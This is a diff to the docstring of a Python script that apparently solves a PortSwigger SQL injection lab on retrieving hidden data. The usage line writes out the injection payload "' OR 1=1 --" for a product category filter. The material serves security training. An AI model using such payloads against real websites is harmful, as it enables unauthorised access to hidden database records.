@@ -5,9 +5,11 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 """ ############################################################################
+Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
+
 01_whereclause.py <exploit_type> <url> <path_qparams> <payload> <visible> <var_to_count>"
 python3 01_whereclause.py wc https://website.net "/filter?category=" "' OR 1=1 --" 12 productId='
-https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data"
 
 SQLi vulnerability in the product category filter. When a category is selected, 
 the application carries out a SQL query like the following:
